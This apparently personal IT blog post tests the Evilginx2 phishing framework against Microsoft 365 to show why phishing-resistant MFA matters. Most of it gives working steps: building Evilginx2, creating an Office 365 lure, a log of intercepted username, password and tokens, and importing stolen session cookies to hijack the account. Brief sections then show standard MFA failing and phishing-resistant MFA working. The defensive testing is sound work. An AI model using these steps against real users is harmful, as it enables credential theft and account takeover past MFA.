---
title: EvilNginx X Phishing Resistant MFA
date: 2025-12-04 17:03:00 +0100
categories: [intune, conditional_access]
tags: [intune, mfa, conditional_access, "365", azure, microsoft]     # TAG names should always be lowercase
author: <mith>  
description: How to enable phishing resistant mfa, and example of why it works
toc: true
---

# Evilnginx Test

## Links:
[How to set up Evilginx to phish Office 365 credentials - JanBakker.tech](https://janbakker.tech/how-to-set-up-evilginx-to-phish-office-365-credentials/#:~:text=In%20the%20next%20step%2C%20we,com)

[GitHub - kgretzky/evilginx2: Standalone man-in-the-middle attack framework used for phishing login credentials along with session cookies, allowing for the bypass of 2-factor authentication](https://github.com/kgretzky/evilginx2)

[evilginx2/phishlets/o365.yaml at master · BakkerJan/evilginx2 · GitHub](https://github.com/BakkerJan/evilginx2/blob/master/phishlets/o365.yaml)

## Installment


```
apt update && apt upgrade -y
apt install golang-go
git clone https://github.com/kgretzky/evilginx2.git
cd evilginx2
go build
```

Make sure wan ports 80 and 443 are pointed towards your server, i tried behind nginx reverse proxy with no luck. This will result in certificate errors. 

Start evilginx:

```
.\evilginx2
```

Correct errors like wan ip, domain name etc. preferebly with config or help command

```
lures create <phishlet>
lures edit <LureNumber> redirect_url https://portal.office.com
lures get-url <LureNumber>
```

start phislet: 
```
phishlets enable <phislet>
```

make sure to see output: 
'[inf] successfully set up all TLS certificates'

If there is an error here run: 

```
phishlets get-hosts <phishlet>
```

And look at your dns records (like cloudflare) they need to be pointed at your evilginx box (wan ip) and **NOT** be proxied (i havent figured out how to solve dns challange for cloudflare)

when your test user clicks the link it will look like this: 

```
[14:29:53] [imp] [0] [o365] new visitor has arrived: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36 Edg/141.0.0.0 <WANIP>
[14:29:53] [inf] [0] [o365] landing URL: <URL>
[14:30:29] [+++] [0] Username: <Username>
[14:30:29] [+++] [0] Username: <Username>
[14:30:29] [+++] [0] Password: <PasswordHash>
[14:30:32] [+++] [0] all authorization tokens intercepted!
[14:30:32] [imp] [0] redirecting to URL: https://portal.office.com (1)
[14:30:32] [imp] [0] dynamic redirect to URL: https://portal.office.com
[14:30:32] [imp] [0] dynamic redirect to URL: https://portal.office.com
```

See sessions: 
```
sessions
```

Select session:
```
sessions <session id>
```

Copy json text (NOT [ cookies ] )

go to firefox (in my case)
install cookie-Editor
go to portal.office.com
Click 'Import' (lower left corner) -> paste json -> import -> refresh site

Tadaa you hacked yourself

## Defend 1 - mfa?

1. go to intune.microsoft.com -> Devices -> Manage devices | Conditional access
	1. Multifactor authentication for all users created by Microsoft

**Conclusion:** 
	No effect at all

## Defend 2 - auth strenght - phishing resistant mfa
1. phishing resistant mfa
	1. proves difficult to set up with VM's 
	2. With physical PC
		1. New Endpoint security rule sat: 
				1. account protection
Conclusion:
	works! 
		